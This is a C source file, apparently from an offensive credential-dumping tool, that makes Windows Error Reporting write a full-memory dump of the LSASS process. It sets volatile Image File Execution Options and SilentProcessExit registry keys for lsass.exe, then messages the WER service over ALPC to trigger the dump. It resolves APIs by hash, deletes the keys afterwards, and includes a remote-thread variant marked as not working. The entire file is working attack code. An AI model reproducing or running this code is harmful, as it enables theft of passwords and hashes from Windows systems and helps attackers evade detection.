#include "werfault.h"

// remove the registry keys created previously
BOOL cleanup_registry_keys(
    IN HANDLE SPEregKeyHandleSub,
    IN HANDLE IFEOregKeyHandle)
{
    BOOL success = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    if (SPEregKeyHandleSub)
    {
        status = NtDeleteKey(SPEregKeyHandleSub);
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtDeleteKey", status);
            goto end;
        }
    }

    if (IFEOregKeyHandle)
    {
        status = NtDeleteKey(IFEOregKeyHandle);
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtDeleteKey", status);
            goto end;
        }
    }

    success = TRUE;

end:

    return success;
}

BOOL set_registry_keys(
    OUT PHANDLE pSPEregKeyHandleSub,
    OUT PHANDLE pIFEOregKeyHandle,
    IN LPCSTR dump_folder)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    BOOL success = FALSE;
    UNICODE_STRING IFEORegistryKeyName = { 0 };
    HANDLE SPEregKeyHandle = NULL;
    UNICODE_STRING SPERegistryKeyName = { 0 };
    LPWSTR proc = L"lsass.exe";
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributesSPE = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributesSPESub = { 0 };
    RtlInitUnicodeString_t RtlInitUnicodeString = NULL;
    RtlAppendUnicodeToString_t RtlAppendUnicodeToString = NULL;
    UNICODE_STRING ReportingModeUnicodeStr = { 0 };
    UNICODE_STRING LocalDumpFolderUnicodeStr = { 0 };
    UNICODE_STRING DumpTypeUnicodeStr = { 0 };
    UNICODE_STRING GlobalFlagUnicodeStr = { 0 };
    WCHAR LocalDumpFolder[MAX_PATH] = { 0 };
    DWORD globalFlagData = 0;
    DWORD ReportingMode = 0;
    DWORD DumpType = 0;

    mbstowcs(LocalDumpFolder, dump_folder, MAX_PATH);

    RtlInitUnicodeString = (RtlInitUnicodeString_t)(ULONG_PTR)get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        RtlInitUnicodeString_SW2_HASH,
        0);
    if (!RtlInitUnicodeString)
    {
        api_not_found("RtlInitUnicodeString");
        return FALSE;
    }

    RtlAppendUnicodeToString = (RtlAppendUnicodeToString_t)(ULONG_PTR)get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        RtlAppendUnicodeToString_SW2_HASH,
        0);
    if (!RtlAppendUnicodeToString)
    {
        api_not_found("RtlAppendUnicodeToString");
        return FALSE;
    }

    // set up registry key name
    IFEORegistryKeyName.Length = 0;
    IFEORegistryKeyName.MaximumLength = 0;
    IFEORegistryKeyName.MaximumLength += (USHORT)wcslen(IFEO_REG_KEY) * sizeof(WCHAR);
    IFEORegistryKeyName.MaximumLength += (USHORT)wcslen(proc) * sizeof(WCHAR);
    IFEORegistryKeyName.MaximumLength +=  2;
    IFEORegistryKeyName.Buffer = intAlloc(IFEORegistryKeyName.MaximumLength);
    if (!IFEORegistryKeyName.Buffer)
    {
        malloc_failed();
        success = FALSE;
        goto end;
    }

    RtlAppendUnicodeToString(&IFEORegistryKeyName, IFEO_REG_KEY);
    RtlAppendUnicodeToString(&IFEORegistryKeyName, proc);

    // Creating the registry key
    InitializeObjectAttributes(&ObjectAttributes, &IFEORegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(
        pIFEOregKeyHandle,
        KEY_ALL_ACCESS,
        &ObjectAttributes,
        0,
        NULL,
        REG_OPTION_VOLATILE,
        0);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateKey", status);
        success = FALSE;
        goto end;
    }

    DPRINT("Registry key has been created : %ls", IFEORegistryKeyName.Buffer);

    // https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-flag-table
    globalFlagData = FLG_MONITOR_SILENT_PROCESS_EXIT;
    RtlInitUnicodeString(&GlobalFlagUnicodeStr, L"GlobalFlag");

    status = NtSetValueKey(
        *pIFEOregKeyHandle,
        &GlobalFlagUnicodeStr,
        0,
        REG_DWORD,
        &globalFlagData,
        sizeof(globalFlagData));
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtSetValueKey", status);
        success = FALSE;
        goto end;
    }

    DPRINT("Registry key value has been created : %ls", GlobalFlagUnicodeStr.Buffer);

    // set up registry key name SPE
    SPERegistryKeyName.Length = 0;
    SPERegistryKeyName.MaximumLength = 0;
    SPERegistryKeyName.MaximumLength += (USHORT)wcslen(SILENT_PROCESS_EXIT_REG_KEY) * sizeof(WCHAR);
    SPERegistryKeyName.MaximumLength += (USHORT)wcslen(proc) * sizeof(WCHAR);
    SPERegistryKeyName.MaximumLength += 2;
    SPERegistryKeyName.Buffer = intAlloc(SPERegistryKeyName.MaximumLength);
    if (!SPERegistryKeyName.Buffer)
    {
        malloc_failed();
        success = FALSE;
        goto end;
    }

    RtlAppendUnicodeToString(&SPERegistryKeyName, SILENT_PROCESS_EXIT_REG_KEY);

    // Creating the registry key
    InitializeObjectAttributes(&ObjectAttributesSPE, &SPERegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(
        &SPEregKeyHandle,
        KEY_ALL_ACCESS,
        &ObjectAttributesSPE,
        0,
        NULL,
        REG_OPTION_VOLATILE,
        0);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateKey", status);
        success = FALSE;
        goto end;
    }

    DPRINT("Registry key has been created : %ls", SPERegistryKeyName.Buffer);

    RtlAppendUnicodeToString(&SPERegistryKeyName, proc);

    // Creating the registry key
    InitializeObjectAttributes(&ObjectAttributesSPESub, &SPERegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(
        pSPEregKeyHandleSub,
        KEY_ALL_ACCESS,
        &ObjectAttributesSPESub,
        0,
        NULL,
        REG_OPTION_VOLATILE,
        0);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateKey", status);
        success = FALSE;
        goto end;
    }

    DPRINT("Registry key has been created : %ls", SPERegistryKeyName.Buffer);

    ReportingMode = MiniDumpWithFullMemory;
    DumpType = LOCAL_DUMP;

    // Set SilentProcessExit registry values for the target process

    RtlInitUnicodeString(&ReportingModeUnicodeStr, L"ReportingMode");
    status = NtSetValueKey(
        *pSPEregKeyHandleSub,
        &ReportingModeUnicodeStr,
        0,
        REG_DWORD,
        &ReportingMode,
        sizeof(DWORD));
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtSetValueKey", status);
        success = FALSE;
        goto end;
    }

    RtlInitUnicodeString(&LocalDumpFolderUnicodeStr, L"LocalDumpFolder");
    status = NtSetValueKey(
        *pSPEregKeyHandleSub,
        &LocalDumpFolderUnicodeStr,
        0,
        REG_SZ,
        LocalDumpFolder,
        (ULONG)wcslen(LocalDumpFolder) * sizeof(WCHAR) + 2);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtSetValueKey", status);
        success = FALSE;
        goto end;
    }

    DPRINT("Sub key LocalDumpFolder has been created");

    RtlInitUnicodeString(&DumpTypeUnicodeStr, L"DumpType");
    status = NtSetValueKey(
        *pSPEregKeyHandleSub,
        &DumpTypeUnicodeStr,
        0,
        REG_DWORD,
        &DumpType,
        sizeof(DWORD));
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtSetValueKey", status);
        success = FALSE;
        goto end;
    }

    DPRINT("Sub key DumpType has been created");

    success = TRUE;

end:
    if (SPEregKeyHandle)
        NtClose(SPEregKeyHandle);
    if (IFEORegistryKeyName.Buffer)
    {
        DATA_FREE(IFEORegistryKeyName.Buffer, IFEORegistryKeyName.MaximumLength);
    }
    if (SPERegistryKeyName.Buffer)
    {
        DATA_FREE(SPERegistryKeyName.Buffer, SPERegistryKeyName.MaximumLength);
    }

    return success;
}

NTSTATUS SignalStartWerSvc(VOID)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG64 WNF_WER_SERVICE_START = 0x41940b3aa3bc0875;
    ULONG32 buffer = 1;

    status = NtQueryWnfStateNameInformation(
        &WNF_WER_SERVICE_START,
        1,
        0,
        &buffer,
        4);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQueryWnfStateNameInformation", status);
        goto end;
    }

    status = NtUpdateWnfStateData(
        &WNF_WER_SERVICE_START,
        NULL,
        0,
        0,
        NULL,
        0,
        0);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtUpdateWnfStateData", status);
        goto end;
    }

end:
    return status;    
}

NTSTATUS WaitForWerSvc(
    IN ULONG32 wait_time)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    HANDLE hEvent = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;
    UNICODE_STRING UnicodeString = { 0 };
    LARGE_INTEGER TimeOut = { 0 };
    RtlInitUnicodeString_t RtlInitUnicodeString = NULL;

    RtlInitUnicodeString = (RtlInitUnicodeString_t)(ULONG_PTR)get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        RtlInitUnicodeString_SW2_HASH,
        0);
    if (!RtlInitUnicodeString)
    {
        api_not_found("RtlInitUnicodeString");
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    RtlInitUnicodeString(&UnicodeString, L"\\KernelObjects\\SystemErrorPortReady");

    InitializeObjectAttributes(
        &ObjectAttributes,
        &UnicodeString,
        0,
        NULL,
        NULL);

    status = NtOpenEvent(
        &hEvent,
        0x100001,
        &ObjectAttributes);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenEvent", status);
        goto end;
    }

    if ((LONG32)wait_time != -1)
    {
        TimeOut.QuadPart = (ULONG64)wait_time * -10000;
    }

    status = NtWaitForSingleObject(
        hEvent,
        FALSE,
        &TimeOut);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWaitForSingleObject", status);
        goto end;
    }

    DPRINT("The WER is ready");

end:
    if (hEvent)
        NtClose(hEvent);

    return status;
}

NTSTATUS SendMessageToWERService(
    IN OUT PWER_API_MESSAGE_SEND api_message_send,
    IN OUT PWER_API_MESSAGE_RECV api_message_recv)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SID sid = { 0 };
    SID_IDENTIFIER_AUTHORITY NtAuthority = { SECURITY_NT_AUTHORITY };
    HANDLE hPort = NULL;
    UNICODE_STRING ustr_port_name = { 0 };
    LARGE_INTEGER TimeOut = { 0 };
    RtlInitUnicodeString_t RtlInitUnicodeString = NULL;
    OBJECT_ATTRIBUTES object_attributes = { 0 };
    ALPC_PORT_ATTRIBUTES port_attributes = { 0 };
    SIZE_T BufferLength = sizeof(WER_API_MESSAGE_SEND);
    ULONG64 wait_time = 0;
    ULONG32 wait_time_1 = 0;
    ULONG32 wait_time_2 = 0;

    RtlInitUnicodeString = (RtlInitUnicodeString_t)(ULONG_PTR)get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        RtlInitUnicodeString_SW2_HASH,
        0);
    if (!RtlInitUnicodeString)
    {
        api_not_found("RtlInitUnicodeString");
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    status = SignalStartWerSvc();
    if (!NT_SUCCESS(status))
    {
        goto end;
    }

    // get the timeout times
    status = NtQuerySystemInformation(
        SystemErrorPortTimeouts,
        &wait_time,
        sizeof(ULONG64),
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQuerySystemInformation", status);
        goto end;
    }
    wait_time_1 = wait_time & 0xffffffff;
    wait_time_2 = (wait_time >> 32) & 0xffffffff;

    status = WaitForWerSvc(wait_time_1);
    if (!NT_SUCCESS(status))
    {
        goto end;
    }

    sid.Revision = 1;
    sid.SubAuthorityCount = 1;
    sid.IdentifierAuthority = NtAuthority;
    sid.SubAuthority[0] = 0x12;

    RtlInitUnicodeString(&ustr_port_name, L"\\WindowsErrorReportingServicePort");

    InitializeObjectAttributes(
        &object_attributes,
        NULL,
        0,
        NULL,
        NULL);

    port_attributes.MaxMessageLength = sizeof(WER_API_MESSAGE_SEND);

    if ((LONG32)wait_time_2 != -1)
    {
        TimeOut.QuadPart = (ULONG64)wait_time_2 * -10000;
    }

    status = NtAlpcConnectPort(
        &hPort,
        &ustr_port_name,
        &object_attributes,
        &port_attributes,
        0x20000,
        &sid,
        NULL,
        NULL,
        NULL,
        NULL,
        &TimeOut);
    if (!NT_SUCCESS(status) || status == STATUS_TIMEOUT)
    {
        syscall_failed("NtAlpcConnectPort", status);
        goto end;
    }

    DPRINT("Port handle: 0x%p", hPort);

    status = NtAlpcSendWaitReceivePort(
        hPort,
        0x20000,
        &api_message_send->port_message,
        NULL,
        &api_message_recv->port_message,
        &BufferLength,
        NULL,
        &TimeOut);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtAlpcSendWaitReceivePort", status);
        goto end;
    }

    DPRINT("Sent the message to the WER service");

end:
    if (hPort)
        NtClose(hPort);

    return status;
}

BOOL rtl_report_silent_process_exit(
    IN DWORD lsass_pid)
{
    BOOL success = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    HANDLE hDupedHandle = NULL;
    DWORD process_id = 0;
    DWORD thread_id = 0;
    WER_API_MESSAGE_SEND api_message_send = { 0 };
    WER_API_MESSAGE_RECV api_message_recv = { 0 };

    process_id = (DWORD)(ULONG_PTR)((struct TEB*)NtCurrentTeb())->ClientId.UniqueProcess;
    thread_id = (DWORD)(ULONG_PTR)((struct TEB*)NtCurrentTeb())->ClientId.UniqueThread;
    if (!lsass_pid || !process_id || !thread_id)
    {
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    DPRINT("LSASS PID: %ld, PID: %ld, TID: %ld", lsass_pid, process_id, thread_id);

    api_message_recv.port_message.u1.s1.DataLength = sizeof(WER_API_MESSAGE_RECV) - sizeof(PORT_MESSAGE);
    api_message_recv.port_message.u1.s1.TotalLength = sizeof(WER_API_MESSAGE_RECV);
    api_message_send.port_message.u1.s1.DataLength = sizeof(WER_API_MESSAGE_SEND) - sizeof(PORT_MESSAGE);
    api_message_send.port_message.u1.s1.TotalLength = sizeof(WER_API_MESSAGE_SEND);
    api_message_send.value1 = 0x30000000;
    api_message_send.ThreadId = thread_id;
    api_message_send.ProcessId = process_id;
    api_message_send.TargetProcessId = lsass_pid;

    status = SendMessageToWERService(
        &api_message_send,
        &api_message_recv);

    if (NT_SUCCESS(status) && status != STATUS_TIMEOUT)
    {
        do
        {
            status = NtWaitForSingleObject(
                api_message_recv.Handle,
                TRUE,
                NULL);
            if (!NT_SUCCESS(status) || status == STATUS_TIMEOUT)
                break;

        } while (status == STATUS_USER_APC || status == STATUS_ALERTED);
        if (api_message_recv.Handle)
            NtClose(api_message_recv.Handle);
    }

    if (NT_SUCCESS(status))
        success = TRUE;

end:
    if (hDupedHandle)
        NtClose(hDupedHandle);

    return success;
}

BOOL werfault_silent_process_exit(
    IN DWORD lsass_pid,
    IN LPCSTR dump_folder)
{
    BOOL success = FALSE;
    HANDLE SPEregKeyHandleSub = NULL;
    HANDLE IFEOregKeyHandle = NULL;
    CHAR dump_name[MAX_PATH] = { 0 };

    success = set_registry_keys(&SPEregKeyHandleSub, &IFEOregKeyHandle, dump_folder);
    if (!success)
    {
        PRINT_ERR("Failed to set the appropiate registry keys");
        goto end;
    }

    success = rtl_report_silent_process_exit(lsass_pid);
    if (!success)
    {
        PRINT_ERR("WerFault did not create the dump");
        goto end;
    }

    sprintf_s(dump_name, MAX_PATH, "lsass.exe-(PID-%ld).dmp", lsass_pid);
    print_success(dump_name, TRUE, FALSE);

    success = TRUE;

end:
    cleanup_registry_keys(SPEregKeyHandleSub, IFEOregKeyHandle);
    if (SPEregKeyHandleSub)
        NtClose(SPEregKeyHandleSub);
    if (IFEOregKeyHandle)
        NtClose(IFEOregKeyHandle);

    return success;
}

// this doesn't work for some reason
BOOL werfault_create_thread(
    IN HANDLE hProcess)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PVOID addr_RtlReportSilentProcessExit = NULL;
    HANDLE hThread = NULL;

    // get the address of RtlReportSilentProcessExit
    addr_RtlReportSilentProcessExit = get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        RtlReportSilentProcessExit_SW2_HASH,
        0);
    if (!addr_RtlReportSilentProcessExit)
    {
        PRINT_ERR("Could not find the address of RtlReportSilentProcessExit");
        return FALSE;
    }
    DPRINT("Address of RtlReportSilentProcessExit: 0x%p", addr_RtlReportSilentProcessExit);

    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        addr_RtlReportSilentProcessExit,
        NtCurrentProcess(), // first param, this will be LSASS' own handle
        0,
        0,
        0,
        0,
        NULL);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERR("Failed to create the thread in " LSASS);
        return FALSE;
    }

    DPRINT("Thread handle: 0x%p", hThread);

    NtClose(hThread); hThread = NULL;

    return TRUE;
}
